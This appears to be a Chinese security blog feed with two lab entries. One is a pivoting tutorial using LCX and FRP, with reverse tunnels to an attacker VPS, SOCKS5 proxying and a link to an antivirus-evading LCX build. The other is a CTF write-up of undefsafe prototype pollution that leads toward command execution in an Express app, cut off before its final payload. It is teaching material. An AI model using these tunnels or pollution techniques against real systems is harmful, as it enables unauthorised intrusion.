        <content type="html"><![CDATA[<h1 id="端口转发和代理"><a href="#端口转发和代理" class="headerlink" title="端口转发和代理"></a>端口转发和代理</h1><p>在渗透测试中，在获取目标外网权限后，需要通过转发端口或搭建代理等方式建立内网通道。</p><h2 id="正向连接与反向连接"><a href="#正向连接与反向连接" class="headerlink" title="正向连接与反向连接"></a>正向连接与反向连接</h2><p>两个基本概念：<strong>正向连接和反向连接</strong>。例如，Metasploit 大致可以分为两种Meterpreter，一种是以 windows&#x2F;meterpreter&#x2F;bind_tcp为代表的 Bind Shell,另一种是以 windows&#x2F;meterpreter&#x2F;reverse_tcp 为代表的 Reverse Shell。其中，Bind Shell用于正向连接，而ReverseShell用于反向连接。</p><ul><li><p>正向连接：正向连接就是受控端主机监听一个端口，由控制端主机主动去连接受控端主机的过程，适用于受控主机具有公网IP的情况下。例如下图中，Attacker 和 Victim 主机都具有公网 IP，Attacker 可以直接通过IP地址访问到 Victim，所以能够使用正向连接来控制 Victim。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325091556352.png" alt="image-20240325091556352"></p></li><li><p>反向连接：反向连接是控制端主机监听一个端口，由受控端主机反向去连接控制端主机的过程适用于受控端主机没有公网 IP 的情况。如图所示，Victim 是一台位于内网并且没有公网 IP 的主机，Attacker 无法直接通过IP地址访问到 Victim。所以此时需要在Attacker 上监听一个端口，让 Victim 去反向连接 Attacker，从而实现对 Victim 的控制。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325092227731.png" alt="image-20240325092227731"></p></li></ul><h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>端口转发(Port Forwarding)是网络地址转换(NAT)的一种应用。通过端口转发，一个网络端口上收到的数据可以被转发给另一个网络端口。转发的端口可以是本机的端口，也可以是其他主机上的端口。</p><p>在现实环境中，内网部署的各种防火墙和入侵检测设备会检查敏感端口上的连接情况，如果发现连接存在异样，就会立即阻断通信。通过端口转发，设置将这个被检测的敏感端口的数据转发到防火墙允许的端口上，建立起一个通信隧道，可以绕过防火墙的检 测并与指定端口进行通信。</p><p>端口映射(Port Mapping)也是网络地址转换(NAT)的一种应用，用于把公网的地址翻译成私有地址。端口映射可以将外网主机收到的请求映射到内网主机上，使得没有公网IP地址的内网主机能够对外提供相应的服务。</p><h2 id="SOCKS代理"><a href="#SOCKS代理" class="headerlink" title="SOCKS代理"></a>SOCKS代理</h2><p>SOCKS 全称为 Protocol For Sessions Traversal Across Firewall Securely，是一种代理协议，其标准端口为1080。SOCKS代理有SOCKS4和SOCKS5两个版本，SOCKS4只支持 TCP，而 SOCKS5 在SOCKS4的基础上进一步扩展，可以支持 UDP 和各种身份验证机制等协议。采用 SOCKS协议的代理服务器被称为SOCKS服务器，这是一种通用的代理服务器，在网络通信中扮演着一个请求代理人的角色。在内网渗透中，通过搭建SOCKS代理，可以与目标内网主机进行通信，避免多次使用端口转发。</p><h1 id="常见转发与代理工具"><a href="#常见转发与代理工具" class="headerlink" title="常见转发与代理工具"></a>常见转发与代理工具</h1><h2 id="LCK"><a href="#LCK" class="headerlink" title="LCK"></a>LCK</h2><p>LCX是一款十分经典的内网端口转发工具，基于Socket套接字，具有端口转发和端口映射的功能。但是目前很多杀毒软件已经将LCX加入了特征库，在实际利用时需要自行做免杀处理。</p><p>这里网上找到了一个免杀处理过的：<a href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p><ol><li><p>目标有公网IP</p><p>如图，假设win_server2012是一台具有公网IP地址的Web服务器。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325100613263.png" alt="image-20240325100613263"></p><p>假设此时已经获取了 WindowsServer 2012的控制权,需要登录其远程桌面查看情况,但是防火墙对 3389端口做了限制，不允许外网机器对 3389端口进行连接。那么，通过端口转发，可以将3389端口转发到其他防火墙允许的端口上，如4444端口，执行下面命令即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lck.exe -tran 4444 127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>然后通过连接 Windows Server 2012的4444端口，即可成功访问其远程桌面</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.13:4444<br></code></pre></td></tr></table></figure></li><li><p>端口映射</p><p>测试环境如图所示。右侧的 Web 服务器(Windows Server 2012)有两个网卡分别连通外网和内网,分别为公网 IP(模拟)地址 192.168.2.13 和内网 IP 地址 10.10.10.13。内网还存在一台 MySQL 服务器。左侧的KaliLinux为测试人员的主机。</p><p>假设已经获取 Windows Server 2012的控制权，经过信息收集，获得内网中 MySQL服务器的 SSH 登录凭据，接下来需要登录这台服务器。但是服务器位于内网，无法直接通过 IP 地址进行访问，所以需要通过端口映射，将 MySOL 服务器的 22 端口映射到Windows Server 2012</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325103859627.png" alt="image-20240325103859627"></p><p>在win_server2012执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -tran 2222 10.10.10.15 22<br></code></pre></td></tr></table></figure><p>然后连接win_server2012的2222端口，即可访问MySQL服务器</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">ssh root@192.168.2.13 -p 2222<br></code></pre></td></tr></table></figure></li><li><p>目标无公网IP</p><p>测试环境如图所示。右侧的 Web服务器(Windows Server 2012)没有公网 IP地址，通过 NAT 对外提供 Web 服务，左侧的 Ubuntu 20.04为测试人员的公网 VPS。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325105824042.png" alt="image-20240325105824042"></p></li></ol><p>先在vps上执行下面命令监听本地4444端口，并将8888端口上接收到的数据转发给本机的4444端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./lck -listen 4444 8888<br></code></pre></td></tr></table></figure><p>然后在 Windows Seryer 2012上执行以下命令,控制 Windows Server 2012 去连接 VPS的8888端口</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">lcx.exe -slave 192.168.2.x8888 127.0.0.1 3389<br></code></pre></td></tr></table></figure><p>然后连接vps的4444端口即可访问远程桌面</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">rdesktop 192.168.2.x:4444<br></code></pre></td></tr></table></figure><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>FRP 是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等协议，可以将内网服务以安全、便捷的方式，通过具有公网 IP 节点的中转暴露到公网。在进行内网渗透中，FRP 是一款常用的隧道工具除此之外，FRP支持搭建SOCKS5代理应用。项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><blockquote><p> 最新的frp似乎不再采用frpc.ini和frps.ini配置文件了，而是.toml后缀的文件。</p><p>具体使用去看官方的说明。我这里还是用回旧的方便学习</p></blockquote><p><strong>现在利用FRP搭建一个SOCKS5代理</strong></p><p>书中的测试环境如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240325164452772.png" alt="image-20240325164452772"></p><blockquote><p>书中搭建了三级代理，这里来说一下多级代理的意思</p><p>首先控制了WinServer2012这台主机，然后上传frp客户端，攻击者用一台vps作为服务端，这样就可以访问到WinServer2012服务器，此时就构建了一层代理。</p><p>然后在WinServer2012起一个frp服务端，上传frp客户端到办公区的服务端，然后再构建一级代理，这样攻击者就能跳两次访问到办公区，这就是二级代理，后面一次类推</p></blockquote><p>这里我只能复现他的一级代理了，没那么多的服务器。我这里用一台kali机器，一台Win7，一台WinServer2012来实验；</p><p>Win7有两张网卡，可以连接处于内网的WinServer2012</p><p><strong>Win7：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414104302628.png" alt="image-20240414104302628"></p><p><strong>WinServer2012</strong></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414104340318.png" alt="image-20240414104340318"></p><p>假设现在已经控制了Win7，我们就可以先搭建一级代理来访问WinServer2012</p><ol><li><p>使用kali机器作为FRP的服务端，执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./frps -c ./frps.ini<br></code></pre></td></tr></table></figure><p>配置文件如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bind_addr = 192.168.172.132 #服务器ip<br>bind_port = 7000  # 服务器上绑定的端口<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414110044664.png" alt="image-20240414110044664"></p><p>可以看到已经成功启动了</p></li><li><p>现在使用Win7这台机器进行配置</p><p>然后执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">.\frpc.exe -c .\frpc.ini<br></code></pre></td></tr></table></figure><p>配置文件如下：</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414110253513.png" alt="image-20240414110253513"></p><blockquote><p>server_addr指向FRP服务端绑定的IP地址</p><p>server_port指向FRP服务端绑定的端口</p><p>remote_port为代理所使用的端口，会被转发到服务端</p><p>plugin为代理的类型</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414110339382.png" alt="image-20240414110339382"></p></li></ol><p>现在就成功搭建了一级代理，可以看到socks代理连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414110437717.png" alt="image-20240414110437717"></p><p>看一下攻击机开放的端口</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414112044521.png" alt="image-20240414112044521"></p><p>然后，借助第三方工具，可以让计算机的其他应用使用这个 SOCKS5 代理,如ProxyChains、Proxifier 等。这里以 ProxyChains 为例进行演示(ProxyChains 是一款可以在 Linux 下实现全局代理的软件，可以使任何应用程序通过代理上网，允许TCP和 DNS 流量通过代理隧道，支持HTTP、SOCKS4、SOCK5类型代理)。</p><p>kali上直接使用下面命令安装即可：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">sudo apt install proxychains4<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://www.kali.org/tools/proxychains-ng/">https://www.kali.org/tools/proxychains-ng/</a></p><p>安装之后我们可以去配置&#x2F;etc下的proxychains.conf配置文件设置代理，最开始的socks记得要注释掉，因为是按顺序走代理的。</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414111433628.png" alt="image-20240414111433628"></p><p>然后使用下面命令去远程连接WinServer2012，我们想要命令或应用使用代理只需要在最前面加上<code>proxychains4</code>或者<code>proxychains</code>即可</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">proxychains rdesktop 192.168.30.10<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240414114656744.png" alt="image-20240414114656744"></p><blockquote><p>不过一开始经常连接超时，后来直接把防火墙关了就成功了</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nssctf刷题-网鼎杯</title>
      <link href="/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/"/>
      <url>/2024/03/20/Nssctf%E5%88%B7%E9%A2%98-%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="网鼎杯-2020青龙组-Notes"><a href="#网鼎杯-2020青龙组-Notes" class="headerlink" title="[网鼎杯 2020青龙组]Notes"></a>[网鼎杯 2020青龙组]Notes</h1><p>这里没给题目源码只能网上找，app.js源码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; exec &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>);<br><br><br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Notes</span> &#123;<br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">owner</span> = <span class="hljs-string">&quot;whoknows&quot;</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span> = &#123;&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">write_note</span>(<span class="hljs-params">author, raw_note</span>) &#123;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[(<span class="hljs-variable language_">this</span>.<span class="hljs-property">num</span>++).<span class="hljs-title function_">toString</span>()] = &#123;<span class="hljs-string">&quot;author&quot;</span>: author,<span class="hljs-string">&quot;raw_note&quot;</span>:raw_note&#125;;<br>    &#125;<br><br>    <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">var</span> r = &#123;&#125;<br>        <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>        <span class="hljs-keyword">return</span> r;<br>    &#125;<br><br>    <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>    &#125;<br><br>    <span class="hljs-title function_">get_all_notes</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>;<br>    &#125;<br><br>    <span class="hljs-title function_">remove_note</span>(<span class="hljs-params">id</span>) &#123;<br>        <span class="hljs-keyword">delete</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>[id];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> notes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notes</span>();<br>notes.<span class="hljs-title function_">write_note</span>(<span class="hljs-string">&quot;nobody&quot;</span>, <span class="hljs-string">&quot;this is nobody&#x27;s first note&quot;</span>);<br><br><br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;views&#x27;</span>, path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;views&#x27;</span>));<br>app.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;pug&#x27;</span>);<br><br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">json</span>());<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public&#x27;</span>)));<br><br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;Notebook&#x27;</span> &#125;);<br>&#125;);<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/add_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&#x27;please use POST to add a note&#x27;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> raw = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (author &amp;&amp; raw) &#123;<br>            notes.<span class="hljs-title function_">write_note</span>(author, raw);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;add note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;did not add note&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/delete_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to delete a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">if</span> (id) &#123;<br>            notes.<span class="hljs-title function_">remove_note</span>(id);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete done&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;delete failed&quot;</span>&#125;);<br>        &#125;<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>        <span class="hljs-keyword">let</span> a_note;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>            a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>        &#125;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>    &#125;)<br><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/status&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> commands = &#123;<br>            <span class="hljs-string">&quot;script-1&quot;</span>: <span class="hljs-string">&quot;uptime&quot;</span>,<br>            <span class="hljs-string">&quot;script-2&quot;</span>: <span class="hljs-string">&quot;free -m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure><p>大概审了一遍之后就会知道，在&#x2F;status路由里面执行了命令，只要能够污染commands里面的属性就能rce，接下来就要去看看怎么样才能污染这个属性。</p><p>看了一下只有undefsafe这个模块能够修改对象的属性，搜了一下该模块在低版本存在原型链污染漏洞，先来了解一下undefsafe模块</p><blockquote><p><code>undefsafe</code> 是一个用于安全地访问对象属性的库。它提供了一种安全的方法来访问嵌套在对象中的属性，而不会导致错误。这在处理可能不存在的属性时非常有用，因为它可以避免抛出异常，但其在低版本（&lt; 2.0.3）中存在原型链污染漏洞。</p></blockquote><p>下面是几个例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;undefsafe&#x27;</span>);<br><br><span class="hljs-keyword">const</span> obj = &#123;<br>  <span class="hljs-attr">a</span>: &#123;<br>    <span class="hljs-attr">b</span>: &#123;<br>      <span class="hljs-attr">c</span>: <span class="hljs-number">3</span><br>    &#125;<br>  &#125;<br>&#125;;<br><br><span class="hljs-keyword">const</span> result = <span class="hljs-title function_">undefsafe</span>(obj, <span class="hljs-string">&#x27;a.b.c&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result); <span class="hljs-comment">// 输出：3</span><br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> undefsafe=<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">const</span> obj=&#123;<br>    <span class="hljs-attr">a</span>:&#123;<br>        <span class="hljs-attr">b</span>:&#123;<br>            <span class="hljs-attr">c</span>:<span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>:<span class="hljs-number">2</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">undefsafe</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>));<span class="hljs-comment">//undefined</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj.<span class="hljs-property">a</span>.<span class="hljs-property">b</span>.<span class="hljs-property">e</span>);<span class="hljs-comment">//报错</span><br><span class="hljs-title function_">undef</span>(obj,<span class="hljs-string">&quot;a.b.e&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//不存在该属性则创建，存在则修改</span><br></code></pre></td></tr></table></figure><p>下面是一个原型链污染的例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;rev1ve&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br></code></pre></td></tr></table></figure><p>这时候toString属性就被我们修改了，那么根据上面的代码他会将commands对象所有的属性列出来，那么我们就可以利用原型链添加一个我们想要的属性值即可。</p><p>能让我们足够自由传参数的污染的函数就是edit_note()</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123; <br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>        <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用了该函数的位置就在&#x2F;edit_note路由</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>    .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>    &#125;)<br>    .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>        <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>        <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>        <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>        <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>            notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>        &#125;<br>    